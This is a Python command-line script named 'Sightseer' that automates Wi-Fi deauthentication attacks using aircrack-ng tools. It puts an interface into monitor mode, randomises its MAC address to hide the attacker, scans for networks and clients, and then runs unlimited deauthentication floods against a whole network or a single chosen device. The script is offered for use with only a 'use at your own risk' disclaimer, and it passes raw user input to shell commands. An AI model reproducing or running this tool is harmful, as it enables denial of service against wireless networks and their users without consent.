# SIGHTSEER
# BY: ORANGEMAN9590
# USE AT YOUR OWN RISK

import os
import time
import termcolor
from termcolor import colored

sightseer_graphic = '''
███████╗██╗ ██████╗ ██╗  ██╗████████╗███████╗███████╗███████╗██████╗ 
██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔════╝██╔════╝██╔══██╗
███████╗██║██║  ███╗███████║   ██║   ███████╗█████╗  █████╗  ██████╔╝
╚════██║██║██║   ██║██╔══██║   ██║   ╚════██║██╔══╝  ██╔══╝  ██╔══██╗
███████║██║╚██████╔╝██║  ██║   ██║   ███████║███████╗███████╗██║  ██║
╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝           
{+}================{DEVELOPED BY: ORANGEMAN}======================={+]
'''



def start_monitormode() :
    print(colored('[*] PUTTING INTERFACE IN MONITOR MODE', 'red'))
    os.system('airmon-ng start ' + interface)
    os.system('macchanger -r ' + interface + 'mon')


def stop_monitormode() :
    print(colored('[*] PUTTING INTERFACE IN MANAGED MODE', 'red'))
    os.system('airmon-ng stop ' + interface + 'mon')


def search_targets() :
    print(colored('[*] PRESS CONTROL+C TO STOP SEARCHING'))
    time.sleep(2)
    os.system('airodump-ng ' + interface + 'mon')


def search_client() :
    print(colored('[*] PRESS CONTROL+C TO STOP SEARCHING'))
    time.sleep(2)
    os.system('airodump-ng ' + interface + 'mon --bssid ' + bssid_network)


def attack_network() :
    os.system('aireplay-ng -0 0 -a ' + bssid_network + ' ' + interface + 'mon')


def attack_client() :
    os.system('aireplay-ng -0 0 -a ' + bssid_network + ' -c ' + client_mac + ' ' + interface + 'mon')


os.system('clear')
print(colored(sightseer_graphic, 'cyan'))
print('{+}=============={INTERFACE SELECTION}================{+}')
os.system('ifconfig')
print('{-}==================================================={-}')
print(colored('PLEASE SELECT INTERFACE', 'red'))
interface = input('sightseer> ')
while True :
    os.system('clear')
    print(colored(sightseer_graphic, 'cyan'))
    print(colored('{+}================={MAIN MENU}===================={+}', 'red'))
    print(colored('[1]=PUT INTERFACE IN MONITOR MODE', 'red'))
    print(colored('[2]=PUT INTERAFCE IN MANAGED MODE', 'red'))
    print(colored('[3]=SEARCH FOR TARGETS', 'red'))
    print(colored('[4]=ENTER ATTACK MENU', 'red'))
    print(colored('[99]=EXIT', 'red'))
    print('')
    main = input('sightseer> ')

    if main == '99' :
        quit()

    if main == '1' :
        start_monitormode()

    if main == '2' :
        stop_monitormode()

    if main == '3' :
        os.system('clear')
        search_targets()
        print(colored('WHAT IS THE CHANNEL OF THE NETWORK', 'magenta'))
        channel = input('sightseer> ')
        os.system('iwconfig ' + interface + 'mon channel ' + channel)
        print(colored('WHAT IS BSSID OF NETWORK', 'magenta'))
        bssid_network = input('sightseer> ')

    if main == '4' :
        os.system('clear')
        print(colored('BSSID: ' + bssid_network, 'red'))
        print(colored('CHANNEL: ' + channel, 'red'))
        print(colored('INTERFACE: ' + interface + 'mon', 'red'))
        print(colored(sightseer_graphic, 'cyan'))
        print('{+}==================={ATTACK MENU}=================={+}')
        print(colored('[1]=ATTACK NETWORK', 'red'))
        print(colored('[2]=ATTACK CLIENT ON NETWORK', 'red'))
        print(colored('[99]=EXIT', 'red'))
        attack = input('sightseer> ')

        if attack == '99' :
            continue

        if attack == '1' :
            os.system('clear')
            attack_network()
            print(colored('DO YOU WANT TO PRESERVE MONITOR MODE ON INTERFACE?[y/n]', 'cyan'))
            moni = input('sightseer> ')
            if moni == 'y' :
                quit()
            elif moni == 'n' :
                stop_monitormode()
                quit()


        if attack == '2' :
            os.system('clear')
            search_client()
            print(colored('WHAT IS THE MAC OF CLIENT', 'red'))
            client_mac = input('sightseer> ')
            attack_client()
            print(colored('DO YOU WANT TO PRESERVE MONITOR MODE ON INTERFACE?[y/n]', 'cyan'))
            moni = input('sightseer> ')
            if moni == 'y' :
                quit()
            elif moni == 'n' :
                stop_monitormode()
                quit()



